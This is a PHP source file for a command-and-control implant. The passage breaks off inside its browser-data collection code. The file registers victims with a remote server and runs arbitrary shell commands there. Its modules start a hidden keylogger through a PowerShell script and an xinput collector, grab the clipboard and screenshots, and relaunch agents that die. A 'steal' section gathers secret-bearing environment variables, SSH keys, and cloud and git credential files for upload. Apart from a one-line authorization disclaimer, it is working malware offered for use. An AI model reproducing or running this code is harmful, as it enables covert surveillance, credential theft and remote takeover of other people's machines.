<?php
// agent.php — C2 agent, PHP port.
//
// Run:
//   php agent.php --server http://127.0.0.1:8000 --token <AGENT_TOKEN> --interval 10 --verbose
//   C2_SERVER=... C2_TOKEN=... php agent.php
//
// Only use against systems you own or are authorized to test.

// ---------------------------------------------------------------- constants

define('SHELL_TIMEOUT', 120);
define('OUTPUT_LIMIT', 12000);

function state_file() {
    global $state_file_override;
    if (!empty($state_file_override)) return $state_file_override;
    $custom = getenv('C2_STATE_FILE');
    if ($custom) return $custom;
    return (getenv('HOME') ?: (getenv('USERPROFILE') ?: '.')) . '/.c2agent.json';
}

// ---------------------------------------------------------------- globals

$server = '';
$token = '';
$agent_id = '';
$interval = 10;
$jitter = 0;
$verbose = false;

// ---------------------------------------------------------------- helpers

function logmsg($msg) {
    global $verbose;
    if ($verbose) fwrite(STDERR, "[*] $msg\n");
}

function truncate_output($text) {
    if (strlen($text) <= OUTPUT_LIMIT) return $text;
    $head = intdiv(OUTPUT_LIMIT, 5);
    $tail = OUTPUT_LIMIT - $head - 40;
    $omitted = strlen($text) - $head - $tail;
    return substr($text, 0, $head)
         . "\n... [$omitted chars truncated] ...\n"
         . substr($text, -$tail);
}

function local_ip() {
    // Best-effort: UDP socket connect to a public resolver and read the
    // bound local address (works without the sockets extension).
    $sock = @stream_socket_client('udp://8.8.8.8:80', $errno, $errstr, 3);
    if ($sock) {
        $local = @stream_socket_get_name($sock, false);
        fclose($sock);
        if ($local) {
            $ip = parse_url($local, PHP_URL_HOST);
            if ($ip) return $ip;
        }
    }
    // Fallback: shell command
    $ip = @trim(shell_exec('hostname -I 2>/dev/null | awk "{print \$1}"'));
    if ($ip) return $ip;
    $ip = @trim(shell_exec('ip route get 1.1.1.1 2>/dev/null | awk \'/src/ {print $7; exit}\''));
    if ($ip) return $ip;
    if (PHP_OS_FAMILY === 'Windows') {
        $out = @shell_exec('ipconfig');
        if (is_string($out) && preg_match('/IPv4 .+?:\s+([0-9.]+)/', $out, $m)) {
            return $m[1];
        }
    }
    return '';
}

function get_os_name() {
    if (PHP_OS_FAMILY === 'Windows') return 'windows';
    if (PHP_OS_FAMILY === 'Darwin') return 'darwin';
    return strtolower(PHP_OS_FAMILY);
}

// ---------------------------------------------------------------- JSON HTTP

function post_json($path, $body) {
    global $server, $token;
    $url = rtrim($server, '/') . $path;
    $data = json_encode($body);

    // Try curl first
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                "X-Agent-Token: $token",
            ],
        ]);
        $response = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ['body' => $response ?: '', 'code' => $code ?: 0];
    }

    // Fallback: stream context
    $opts = [
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\nX-Agent-Token: $token\r\n",
            'content' => $data,
            'timeout' => 15,
            'ignore_errors' => true,
        ],
    ];
    $ctx = stream_context_create($opts);
    $response = @file_get_contents($url, false, $ctx);
    $code = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $h) {
            if (preg_match('#^HTTP/\S+\s+(\d+)#', $h, $m)) {
                $code = (int)$m[1];
            }
        }
    }
    return ['body' => $response ?: '', 'code' => $code];
}

function get_url($path) {
    global $server, $token;
    $url = rtrim($server, '/') . $path;

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 120,
            CURLOPT_HTTPHEADER => ["X-Agent-Token: $token"],
        ]);
        $response = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ['body' => $response ?: '', 'code' => $code ?: 0];
    }

    $opts = [
        'http' => [
            'method' => 'GET',
            'header' => "X-Agent-Token: $token\r\n",
            'timeout' => 120,
            'ignore_errors' => true,
        ],
    ];
    $ctx = stream_context_create($opts);
    $response = @file_get_contents($url, false, $ctx);
    $code = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $h) {
            if (preg_match('#^HTTP/\S+\s+(\d+)#', $h, $m)) {
                $code = (int)$m[1];
            }
        }
    }
    return ['body' => $response ?: '', 'code' => $code];
}

// ---------------------------------------------------------------- state

function load_id() {
    global $agent_id;
    if (!file_exists(state_file())) return;
    $data = @json_decode(file_get_contents(state_file()), true);
    if (isset($data['agent_id'])) $agent_id = $data['agent_id'];
}

function save_id() {
    global $agent_id;
    file_put_contents(state_file(), json_encode(['agent_id' => $agent_id]));
}

// ------------------------------------------------------------- lifecycle

function register() {
    global $server, $token, $agent_id;
    $body = [
        'agent_id' => $agent_id ?: null,
        'hostname' => gethostname() ?: 'unknown',
        'username' => get_current_user(),
        'os'       => get_os_name(),
        'arch'     => php_uname('m'),
        'pid'      => getmypid(),
        'ip'       => local_ip(),
        'version'  => '1.0',
        'type'     => 'PHP',
    ];
    logmsg("registering with $server");
    $res = post_json('/api/register', $body);
    if ($res['code'] !== 200) {
        fwrite(STDERR, "register failed: HTTP {$res['code']} — will retry on next checkin\n");
        return;
    }
    $data = json_decode($res['body'], true);
    $agent_id = $data['agent_id'] ?? '';
    save_id();
    logmsg("agent id: $agent_id");
}

function checkin() {
    global $agent_id;
    $res = post_json('/api/checkin', ['agent_id' => $agent_id]);
    if ($res['code'] === 404) {
        logmsg("server does not know us — re-registering");
        register();
        return [];
    }
    if ($res['code'] !== 200) {
        logmsg("checkin failed: HTTP {$res['code']}");
        return [];
    }
    $data = json_decode($res['body'], true);
    return $data['tasks'] ?? [];
}

function report($task_id, $output, $exit_code, $error = '') {
    global $agent_id;
    post_json('/api/result', [
        'agent_id'  => $agent_id,
        'task_id'   => $task_id,
        'output'    => $output ?: '',
        'exit_code' => $exit_code,
        'error'     => $error ?: '',
    ]);
}

// ---------------------------------------------------------------- tasks

function run_shell($command, $timeout = SHELL_TIMEOUT) {
    logmsg("executing: $command");
    $timeout = max(1, min((int)$timeout, 3600));
    // Use proc_open for timeout control
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];
    $proc = proc_open($command, $descriptors, $pipes, null, null);
    if (!is_resource($proc)) {
        return ['output' => "failed to execute command", 'exit_code' => 1];
    }
    fclose($pipes[0]);
    $output = '';
    $start = time();
    while (true) {
        $read = [$pipes[1], $pipes[2]];
        $write = $except = null;
        $n = @stream_select($read, $write, $except, 1);
        if ($n > 0) {
            foreach ($read as $stream) {
                $output .= fread($stream, 8192);
            }
        }
        if ((time() - $start) >= $timeout) {
            proc_terminate($proc, 9);
            proc_close($proc);
            return ['output' => truncate_output($output) . "\ncommand timed out ({$timeout}s)", 'exit_code' => 124];
        }
        $status = proc_get_status($proc);
        if (!$status['running']) {
            // Read remaining
            while (!feof($pipes[1])) $output .= fread($pipes[1], 8192);
            while (!feof($pipes[2])) $output .= fread($pipes[2], 8192);
            break;
        }
    }
    fclose($pipes[1]);
    fclose($pipes[2]);
    $exit_code = proc_close($proc);
    return ['output' => truncate_output($output), 'exit_code' => $exit_code];
}

function task_download($task_id, $args) {
    $fname = $args['file'] ?? 'payload.bin';
    $dest = $args['destination'] ?? $fname;
    logmsg("downloading $fname to $dest");

    $res = get_url("/api/files/$task_id");
    if ($res['code'] !== 200) {
        return ['output' => "download failed: HTTP {$res['code']}", 'exit_code' => 1];
    }

    if (is_dir($dest)) {
        $dest = rtrim($dest, '/\\') . '/' . basename($fname);
    }
    $parent = dirname($dest);
    if (!is_dir($parent)) {
        @mkdir($parent, 0755, true);
    }
    file_put_contents($dest, $res['body']);
    return ['output' => "saved " . strlen($res['body']) . " bytes to $dest", 'exit_code' => 0];
}

function task_upload($task_id, $args) {
    global $server, $token;
    $path = $args['path'] ?? '';
    if (!$path || !is_file($path)) {
        return ['output' => "file not found: $path", 'exit_code' => 1];
    }
    logmsg("uploading $path");

    if (function_exists('curl_init')) {
        $ch = curl_init(rtrim($server, '/') . "/api/files/$task_id");
        $file_data = new CURLFile($path);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => ['file' => $file_data],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 300,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
            CURLOPT_HTTPHEADER => ["X-Agent-Token: $token"],
        ]);
        $res = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code === 200) {
            return ['output' => "uploaded $path", 'exit_code' => 0];
        }
        return ['output' => "upload failed: HTTP $code", 'exit_code' => 1];
    }

    // Fallback: multipart form via shell
    $escaped = escapeshellarg($path);
    $url = rtrim($server, '/') . "/api/files/$task_id";
    $cmd = "curl -s -X POST \"$url\" -H \"X-Agent-Token: $token\" -F \"file=@$escaped\" --max-time 300 -o /dev/null -w '%{http_code}'";
    $code = @trim(shell_exec($cmd));
    if ($code === '200') {
        return ['output' => "uploaded $path", 'exit_code' => 0];
    }
    return ['output' => "upload failed: HTTP $code", 'exit_code' => 1];
}

function task_sleep($args) {
    global $interval;
    $secs = max(1, (int)($args['seconds'] ?? 10));
    $interval = $secs;
    return ['output' => "heartbeat interval set to {$interval}s", 'exit_code' => 0];
}

// ---------------------------------------------------------------- keylog
// File-based keystroke logger. 'start' spawns a background collector
// (PowerShell GetAsyncKeyState on Windows, xinput->awk on Linux) that appends
// to a log file; 'dump' stops the collector and returns the captured text.

function klog_base() {
    global $agent_id;
    return rtrim(sys_get_temp_dir(), '/\\') . DIRECTORY_SEPARATOR . ".c2keylog_$agent_id";
}

function proc_alive($pid) {
    if (!is_numeric($pid) || $pid <= 0) return false;
    if (PHP_OS_FAMILY === 'Windows') {
        $out = @shell_exec("tasklist /FI \"PID eq $pid\" 2>NUL");
        return is_string($out) && (bool)preg_match('/\b' . preg_quote($pid, '/') . '\b/', $out);
    }
    @exec("kill -0 " . (int)$pid . " 2>/dev/null", $o, $rc);
    return $rc === 0;
}

function klog_write_collectors($base) {
    $ps = <<<'PS'
$C2P = $env:C2P; $C2K = $env:C2K
[IO.File]::WriteAllText($C2P, [string]$PID)
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);[DllImport("user32.dll")]public static extern short GetKeyState(int v);}'
$l = New-Object 'bool[]' 256
while (1) {
  Start-Sleep -Milliseconds 25
  for ($v = 8; $v -le 190; $v++) {
    $d = (([K]::GetAsyncKeyState($v) -band 1) -ne 0)
    if ($d -ne $l[$v]) {
      if ($d) {
        $c = $null
        if ($v -ge 65 -and $v -le 90) { $sh = (([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0); $cp = (([K]::GetKeyState(20) -band 1) -ne 0); $c = [char]($v + $(if ($sh -ne $cp) { 0 } else { 32 })) }
        elseif ($v -ge 48 -and $v -le 57) { $c = [char]$v } elseif ($v -eq 32) { $c = ' ' }
        elseif ($v -eq 13) { $c = [char]10 } elseif ($v -eq 9) { $c = '[TAB]' }
        elseif ($v -eq 8) { $c = '[BACKSPACE]' } elseif ($v -eq 27) { $c = '[ESC]' } elseif ($v -eq 46) { $c = '[DEL]' }
        elseif ($v -eq 37) { $c = '[LEFT]' } elseif ($v -eq 38) { $c = '[UP]' }
        elseif ($v -eq 39) { $c = '[RIGHT]' } elseif ($v -eq 40) { $c = '[DOWN]' }
        elseif ($v -ge 112 -and $v -le 123) { $c = '[F' + ($v - 111) + ']' }
        elseif ($v -eq 186) { $c = ';' } elseif ($v -eq 187) { $c = '=' }
        elseif ($v -eq 188) { $c = ',' } elseif ($v -eq 189) { $c = '-' }
        elseif ($v -eq 190) { $c = '.' } elseif ($v -eq 191) { $c = '/' }
        elseif ($v -eq 192) { $c = '`' } elseif ($v -eq 219) { $c = '[' }
        elseif ($v -eq 220) { $c = '\' } elseif ($v -eq 221) { $c = ']' }
        elseif ($v -eq 222) { $c = "'" }
        if ($c) { [IO.File]::AppendAllText($C2K, [string]$c) }
      }
      $l[$v] = $d
    }
  }
}
PS;
    file_put_contents("$base.ps1", $ps);
    $sh = <<<'SH'
#!/bin/sh
C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}
echo $$ > "$C2P"
kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
[ -z "$kid" ] && exit 1
xinput test "$kid" 2>/dev/null | awk -v p="$C2K" '
BEGIN { n = split("2 3 4 5 6 7 8 9 10 11 16 17 18 19 20 21 22 23 24 25 30 31 32 33 34 35 36 37 38 44 45 46 47 48 49 50", a, " "); s = "1234567890qwertyuiopasdfghjklzxcvbnm"; for (i = 1; i <= length(s); i++) m[a[i]] = substr(s, i, 1) }
{ if ($1 == "key" && $2 == "press") { c = m[$3]; if ($3 == 57) c = " "; else if ($3 == 28) c = "\n"; else if ($3 == 15) c = "[TAB]"; else if ($3 == 14) c = "[BACKSPACE]"; else if ($3 == 1) c = "[ESC]"; else if ($3 == 111) c = "[DEL]"; else if ($3 == 42 || $3 == 54) c = "[SHIFT]"; else if ($3 == 29 || $3 == 97) c = "[CTRL]"; else if ($3 == 56 || $3 == 100) c = "[ALT]"; if (c != "") printf "%s", c > p } }'
SH;
    file_put_contents("$base.sh", $sh);
}

function klog_start() {
    $base = klog_base();
    $pidf = "$base.pid"; $logf = "$base.log";
    if (file_exists($pidf)) {
        $pid = trim((string)@file_get_contents($pidf));
        if (proc_alive($pid)) {
            return ['output' => 'keylogger already running', 'exit_code' => 0];
        }
    }
    klog_write_collectors($base);
    @unlink($logf);
    putenv("C2P=$pidf");
    putenv("C2K=$logf");
    if (PHP_OS_FAMILY === 'Windows') {
        $nul = 'NUL';
        $cmd = ['powershell', '-NoProfile', '-WindowStyle', 'Hidden',
                '-ExecutionPolicy', 'Bypass', '-File', "$base.ps1"];
        // detached: throwaway proc_open, child keeps running, output to NUL
        @proc_open($cmd,
            [0 => ['file', $nul, 'r'], 1 => ['file', $nul, 'w'], 2 => ['file', $nul, 'w']],
            $pipes, null, null, ['bypass_shell' => true]);
    } elseif (PHP_OS_FAMILY === 'Darwin') {
        return ['output' => 'error: keylogger not supported on macOS', 'exit_code' => 1];
    } else {
        shell_exec("nohup sh '$base.sh' >/dev/null 2>&1 &");
    }
    for ($i = 0; $i < 120; $i++) {
        if (file_exists($pidf)) break;
        usleep(250000);
    }
    if (!file_exists($pidf)) {
        return ['output' => 'error: no keylogging tool available (powershell/xinput needed)', 'exit_code' => 1];
    }
    return ['output' => 'keylogger started', 'exit_code' => 0];
}

function klog_stop() {
    $base = klog_base();
    $pidf = "$base.pid";
    if (!file_exists($pidf)) {
        return ['output' => 'keylogger not running', 'exit_code' => 0];
    }
    $pid = trim((string)@file_get_contents($pidf));
    if (proc_alive($pid)) {
        if (PHP_OS_FAMILY === 'Windows') {
            @shell_exec("taskkill /PID $pid /F /T >NUL 2>&1");
        } else {
            @shell_exec('kill -9 ' . (int)$pid . ' >/dev/null 2>&1');
        }
    }
    @unlink($pidf);
    return ['output' => 'keylogger stopped', 'exit_code' => 0];
}

function klog_dump() {
    $res = klog_stop();
    $out = $res['output'];
    if (!in_array($out, ['keylogger stopped', 'keylogger not running'], true)) {
        return $res;
    }
    $data = @file_get_contents(klog_base() . '.log');
    if ($data === false || $data === '') {
        return ['output' => '(no keystrokes recorded)', 'exit_code' => 0];
    }
    if (strlen($data) > 8000) $data = '...' . substr($data, -8000);
    return ['output' => $data, 'exit_code' => 0];
}

function task_keylog($args) {
    $action = strtolower($args['action'] ?? 'dump');
    switch ($action) {
        case 'start': return klog_start();
        case 'stop':  return klog_stop();
        default:      return klog_dump();
    }
}

function task_clipboard($args) {
    $action = strtolower($args['action'] ?? 'get');
    try {
        if ($action === 'set') {
            $text = $args['text'] ?? '';
            if (PHP_OS_FAMILY === 'Windows') {
                shell_exec("powershell -command \"Set-Clipboard -Value '" . addslashes($text) . "'\"");
            } elseif (PHP_OS_FAMILY === 'Darwin') {
                $proc = popen('pbcopy', 'w');
                fwrite($proc, $text);
                pclose($proc);
            } else {
                $proc = popen('xclip -selection clipboard', 'w');
                fwrite($proc, $text);
                pclose($proc);
            }
            return ['output' => 'clipboard set', 'exit_code' => 0];
        } else {
            if (PHP_OS_FAMILY === 'Windows') {
                $text = @trim(shell_exec('powershell -command Get-Clipboard'));
            } elseif (PHP_OS_FAMILY === 'Darwin') {
                $text = @shell_exec('pbpaste');
            } else {
                $text = @shell_exec('xclip -selection clipboard -o');
            }
            return ['output' => $text ?: '', 'exit_code' => 0];
        }
    } catch (\Exception $e) {
        return ['output' => "error: " . $e->getMessage(), 'exit_code' => 1];
    }
}

function task_screenshot($task_id, $args) {
    global $server, $token;
    $label = preg_replace('/\s+/', '', $args['name'] ?? 'screenshot');
    if ($label === '') $label = 'screenshot';
    $tmp = rtrim(sys_get_temp_dir(), '/\\') . DIRECTORY_SEPARATOR . 'c2shot_' . uniqid() . '.png';

    if (PHP_OS_FAMILY === 'Windows') {
        $psfile = $tmp . '.ps1';
        $save = str_replace('\\', '/', $tmp);
        file_put_contents($psfile, <<<PS
Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
\$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
\$bmp=New-Object System.Drawing.Bitmap(\$b.Width,\$b.Height);
\$g=[System.Drawing.Graphics]::FromImage(\$bmp);
\$g.CopyFromScreen(\$b.Location,[System.Drawing.Point]::Empty,\$b.Size);
\$bmp.Save('$save');
PS);
        shell_exec("powershell -NoProfile -ExecutionPolicy Bypass -File \"$psfile\"");
        @unlink($psfile);
    } elseif (PHP_OS_FAMILY === 'Darwin') {
        shell_exec('screencapture -x ' . escapeshellarg($tmp));
    } else {
        $tried = false;
        foreach (['import -window root', 'scrot ', 'gnome-screenshot -f '] as $t) {
            $cmd = $t === 'scrot ' ? 'scrot ' : $t;
            $tool = explode(' ', trim($cmd))[0];
            if (trim(shell_exec('command -v ' . $tool)) !== '') {
                shell_exec($cmd . escapeshellarg($tmp));
                $tried = true;
                break;
            }
        }
    }

    $data = file_get_contents($tmp);
    $final = $data !== false;
    @unlink($tmp);
    if (!$final || strlen($data) === 0) {
        return ['output' => "error: screenshot failed (no tool or permission)", 'exit_code' => 1];
    }

    $url = rtrim($server, '/') . "/api/files/$task_id";
    $cmd = 'curl -s -X POST ' . escapeshellarg($url)
         . ' -H "X-Agent-Token: ' . $token . '"'
         . ' -F "file=@' . escapeshellarg($tmp) . ';filename=' . $label . '.png"'
         . ' --max-time 120 -o /dev/null -w "%{http_code}"';
    // Recreate temp file for curl upload
    file_put_contents($tmp, $data);
    $code = @trim(shell_exec($cmd));
    @unlink($tmp);
    if ($code === '200') {
        return ['output' => "screenshot saved ($label.png)", 'exit_code' => 0];
    }
    return ['output' => "screenshot upload failed: HTTP $code", 'exit_code' => 1];
}

// ------------------------------------------------------------------ clone
// Cross-agent resurrection watchdog. Monitors a target agent via the
// server; if dead/stale, runs a relaunch command. A detached background
// PHP process performs the status-check loop; the main agent writes
// state to a JSON file so start/stop/status can coordinate.

define('CLONE_LOOP_SCRIPT', sys_get_temp_dir() . '/c2_clone_loop.php');

function clones_file() {
    global $agent_id;
    return sys_get_temp_dir() . '/.c2clones_' . $agent_id . '.json';
}

function load_clones() {
    $f = clones_file();
    if (!file_exists($f)) return [];
    $data = @json_decode(file_get_contents($f), true);
    return is_array($data) ? $data : [];
}

function save_clones($clones) {
    file_put_contents(clones_file(), json_encode($clones, JSON_PRETTY_PRINT));
}

function clone_get_agent_id() {
    global $state_file_override;
    $sf = '';
    if (!empty($state_file_override)) $sf = $state_file_override;
    else $sf = getenv('C2_STATE_FILE') ?: (getenv('HOME') ?: (getenv('USERPROFILE') ?: '.')) . '/.c2agent.json';
    if (!file_exists($sf)) return '';
    $d = @json_decode(file_get_contents($sf), true);
    return $d['agent_id'] ?? '';
}

function clone_http_get($url, $token) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_HTTPHEADER => ["X-Agent-Token: $token"],
        ]);
        $body = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ['body' => $body ?: '', 'code' => $code ?: 0];
    }
    $opts = [
        'http' => [
            'method' => 'GET',
            'header' => "X-Agent-Token: $token\r\n",
            'timeout' => 15,
            'ignore_errors' => true,
        ],
    ];
    $ctx = stream_context_create($opts);
    $body = @file_get_contents($url, false, $ctx);
    $code = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $h) {
            if (preg_match('#^HTTP/\S+\s+(\d+)#', $h, $m)) $code = (int)$m[1];
        }
    }
    return ['body' => $body ?: '', 'code' => $code];
}

function write_clone_loop_script() {
    $src = dirname(__FILE__) . '/agent.php';
    $self = var_export($src, true);
    $clones_f = var_export(clones_file(), true);
    $script = <<<'CLONELOOP'
<?php
$self = __SELF__;
$clonesFile = __CLONES__;
$token = $argv[1] ?? '';
$server = $argv[2] ?? '';
$target = $argv[3] ?? '';
$interval = (int)($argv[4] ?? 30);
if (!$token || !$server || !$target) exit(1);

function clone_http_get($url, $token) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_HTTPHEADER => ["X-Agent-Token: $token"],
        ]);
        $body = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ['body' => $body ?: '', 'code' => $code ?: 0];
    }
    $opts = ['http' => ['method' => 'GET', 'header' => "X-Agent-Token: $token\r\n", 'timeout' => 15, 'ignore_errors' => true]];
    $ctx = stream_context_create($opts);
    $body = @file_get_contents($url, false, $ctx);
    $code = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $h) { if (preg_match('#^HTTP/\S+\s+(\d+)#', $h, $m)) $code = (int)$m[1]; }
    }
    return ['body' => $body ?: '', 'code' => $code];
}

while (true) {
    $clones = file_exists($clonesFile) ? (json_decode(file_get_contents($clonesFile), true) ?: []) : [];
    $entry = $clones[$target] ?? null;
    if (!$entry || empty($entry['stop'])) {
        $now = date('Y-m-d H:i:s');
        $r = clone_http_get(rtrim($server, '/') . '/api/clone/status/' . $target, $token);
        if ($r['code'] === 404) {
            $clones[$target]['status'] = 'unknown';
            $clones[$target]['last_check'] = 'target gone';
        } elseif ($r['code'] === 200) {
            $data = json_decode($r['body'], true);
            $st = $data['status'] ?? 'unknown';
            $clones[$target]['status'] = $st;
            $clones[$target]['last_check'] = $now;
            if (in_array($st, ['dead', 'stale'], true) && !empty($entry['command'])) {
                $clones[$target]['relaunches'] = ($clones[$target]['relaunches'] ?? 0) + 1;
                $cmd = $entry['command'];
                if (PHP_OS_FAMILY === 'Windows') {
                    pclose(popen("start /B cmd /c \"$cmd\"", 'r'));
                } else {
                    shell_exec("nohup sh -c " . escapeshellarg($cmd) . " >/dev/null 2>&1 &");
                }
                $clones[$target]['status'] = 'relaunched';
            }
        } else {
            $clones[$target]['status'] = 'http ' . $r['code'];
            $clones[$target]['last_check'] = $now;
        }
        file_put_contents($clonesFile, json_encode($clones));
    }
    sleep($interval);
}
CLONELOOP;
    $script = str_replace('__SELF__', $self, $script);
    $script = str_replace('__CLONES__', $clones_f, $script);
    file_put_contents(CLONE_LOOP_SCRIPT, $script);
}

function task_clone($args) {
    global $server, $token;
    $action = strtolower(trim($args['action'] ?? 'start'));
    $target = trim($args['target'] ?? '') ?: clone_get_agent_id();
    $command = trim($args['command'] ?? '');
    $interval = 30;
    try { $interval = max(5, min((int)($args['interval'] ?? 30), 3600)); } catch (\Exception $e) {}

    if ($action === 'stop') {
        $clones = load_clones();
        if (empty($clones[$target])) {
            return ['output' => "clone: no watcher for $target", 'exit_code' => 1];
        }
        $entry = $clones[$target];
        if (!empty($entry['pid'])) {
            $pid = (int)$entry['pid'];
            if (PHP_OS_FAMILY === 'Windows') {
                @shell_exec("taskkill /PID $pid /F /T >NUL 2>&1");
            } else {
                @shell_exec("kill " . $pid . " >/dev/null 2>&1");
            }
        }
        unset($clones[$target]);
        save_clones($clones);
        return ['output' => "clone: watcher for $target stopped", 'exit_code' => 0];
    }

    if ($action === 'status') {
        $clones = load_clones();
        if (empty($clones)) {
            return ['output' => 'clone: no watchers running', 'exit_code' => 0];
        }
        $lines = [];
        foreach ($clones as $tid => $info) {
            $lines[] = '  ' . $tid . ': ' . ($info['status'] ?? '?')
                     . ' | last_check ' . ($info['last_check'] ?? '?')
                     . ' | relaunched ' . ($info['relaunches'] ?? 0) . 'x'
                     . ' | cmd: ' . ($info['command'] ?? '(none)');
        }
        sort($lines);
        return ['output' => "clone watchers:\n" . implode("\n", $lines), 'exit_code' => 0];
    }

    // start
    $clones = load_clones();
    if (!empty($clones[$target])) {
        return ['output' => "clone: watcher for $target already running", 'exit_code' => 1];
    }
    if (!$command) {
        return ['output' => "clone: 'command' (relaunch cmd) required", 'exit_code' => 1];
    }

    write_clone_loop_script();
    $script = CLONE_LOOP_SCRIPT;
    $escaped_token = escapeshellarg($token);
    $escaped_server = escapeshellarg($server);
    $escaped_target = escapeshellarg($target);
    $escaped_interval = escapeshellarg((string)$interval);

    if (PHP_OS_FAMILY === 'Windows') {
        $cmd = "start /B php " . escapeshellarg($script)
             . " $escaped_token $escaped_server $escaped_target $escaped_interval";
        pclose(popen($cmd, 'r'));
    } else {
        shell_exec("nohup php " . escapeshellarg($script)
             . " $escaped_token $escaped_server $escaped_target $escaped_interval >/dev/null 2>&1 &");
    }

    $clones[$target] = [
        'status'     => 'starting',
        'last_check' => 'never',
        'relaunches' => 0,
        'command'    => $command,
    ];
    save_clones($clones);

    return [
        'output'    => "clone: watcher started on target $target (every {$interval}s, restart cmd: $command)",
        'exit_code' => 0,
    ];
}

// ------------------------------------------------------------------- steal
// Collect env tokens, credential files and raw browser DBs into a zip,
// upload via multipart POST. No decryption — raw copies only.

define('STEAL_MAX_FILE', 8 * 1024 * 1024);
define('STEAL_KEYWORDS', 'token,secret,password,passwd,key=,api,auth,aws,azure,google,github,gitlab,slack,discord,cookie,session,credential,access,proxy,login');
define('STEAL_TOKEN_FILES', '.aws/credentials|.aws/config|.git-credentials|.netrc|.npmrc|.pypirc|.pip/pip.conf|.config/pip/pip.conf|.config/gh/hosts.yml|.config/rclone/rclone.conf|.config/gcloud/credentials.json|.config/gcloud/access_tokens.db|.docker/config.json|.kube/config|.ssh/id_rsa|.ssh/id_ed25519|.ssh/id_ecdsa|.ssh/config|.ssh/known_hosts|.ssh/authorized_keys');

function steal_home() {
    return getenv('HOME') ?: getenv('USERPROFILE') ?: '';
}

function steal_safe_copy($src, $dst_dir) {
    if (!is_file($src)) return false;
    if (filesize($src) > STEAL_MAX_FILE) return false;
    if (!is_dir($dst_dir)) @mkdir($dst_dir, 0755, true);
    $dst = rtrim($dst_dir, '/\\') . DIRECTORY_SEPARATOR . basename($src);
    return @copy($src, $dst);
}

function steal_collect_env($work) {
    $keywords = explode(',', STEAL_KEYWORDS);
    $lines = [];
    foreach ($_ENV as $k => $v) {
        $low = strtolower($k);
        foreach ($keywords as $w) {
            if ($w !== '' && strpos($low, $w) !== false) {
                $lines[] = "$k=$v";
                break;
            }
        }
    }
    if (empty($lines)) return [];
    sort($lines);
    file_put_contents("$work/env.txt", implode("\n", $lines) . "\n");
    return ['env.txt'];
}

function steal_collect_tokens($work) {
    $home = steal_home();
    if (!$home) return [];
    $files = explode('|', STEAL_TOKEN_FILES);
    $hits = [];
    foreach ($files as $rel) {
        $src = rtrim($home, '/\\') . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $rel);
        if (steal_safe_copy($src, "$work/tokens")) {
            $hits[] = 'tokens/' . basename($rel);
        }
    }
    return $hits;
}

function steal_browser_roots() {
    $home = steal_home();
    $roots = [];
    if (PHP_OS_FAMILY === 'Windows') {
        $la = getenv('LOCALAPPDATA') ?: '';
        $appd = getenv('APPDATA') ?: '';
        foreach (['Google/Chrome/User Data', 'Microsoft/Edge/User Data', 'BraveSoftware/Brave-Browser/User Data', 'Opera Software/Opera Stable'] as $rel) {
            if ($la) $roots[rtrim($la, '/\\') . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $rel)] = 'chromium';
        }
        if ($appd) $roots[rtrim($appd, '/\\') . DIRECTORY_SEPARATOR . 'Mozilla' . DIRECTORY_SEPARATOR . 'Firefox' . DIRECTORY_SEPARATOR . 'Profiles'] = 'firefox';
    } elseif (PHP_OS_FAMILY === 'Darwin') {
        $base = rtrim($home, '/\\') . DIRECTORY_SEPARATOR . 'Library' . DIRECTORY_SEPARATOR . 'Application Support';
        foreach (['Google/Chrome', 'Microsoft Edge', 'BraveSoftware/Brave-Browser'] as $name) {
            $roots[$base . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $name)] = 'chromium';
        }
        $roots[$base . DIRECTORY_SEPARATOR . 'Firefox' . DIRECTORY_SEPARATOR . 'Profiles'] = 'firefox';
    } else {
        foreach (['google-chrome', 'chromium'] as $r) {
            $roots[$home . '/.config/' . $r] = 'chromium';
        }
        foreach (['microsoft-edge', 'msedge'] as $r) {
